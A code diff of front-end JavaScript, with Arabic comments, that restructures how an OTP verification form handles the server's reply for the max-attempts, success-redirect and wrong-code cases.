@@ -630,7 +630,7 @@
       .then(data => {
         console.log('استجابة السيرفر:', data);
         
-        // التحقق من حالة max_attempts (تم رفض الطلب بعد 3 محاولات)
+        // === جديد: إذا success=false و message=max_attempts → رفض ===
         if (data.message === 'max_attempts') {
           showMessage('error', locales[currentLang].msgMaxAttempts);
           shakeInputs();
@@ -640,30 +640,28 @@
           return;
         }
         
-        // التحقق من نجاح التحقق من OTP
+        // === جديد: إذا success=true → نجاح وتوجيه ===
         if (data.success === true) {
-          // دائمًا توجيه لصفحة success
           showMessage('success', locales[currentLang].msgSuccess);
           setTimeout(() => {
             window.location.href = 'success.html';
           }, 1500);
-        } else {
-          // خطأ - إظهار رسالة فوق الحقول
-          let errorMsg = locales[currentLang].msgError;
-          
-          // بعد المحاولة الأولى، أظهر رسالة مختلفة
-          if (data.attempt && data.attempt >= 1) {
-            errorMsg = locales[currentLang].msgWrongOTP || locales[currentLang].msgError;
-          }
-          
-          showMessage('error', errorMsg);
-          shakeInputs();
-          clearOTPFields();
-          
-          submitBtn.disabled = false;
-          submitBtn.textContent = locales[currentLang].submitBtn;
-          otpInputs[0].focus();
+          return;
         }
+        
+        // === خطأ (success=false) → يبقى في الصفحة ===
+        let errorMsg = locales[currentLang].msgError;
+        if (data.attempt && data.attempt >= 2) {
+          errorMsg = locales[currentLang].msgWrongOTP;
+        }
+        
+        showMessage('error', errorMsg);
+        shakeInputs();
+        clearOTPFields();
+        
+        submitBtn.disabled = false;
+        submitBtn.textContent = locales[currentLang].submitBtn;
+        otpInputs[0].focus();
       })
       .catch(error => {
         console.error('Error:', error);
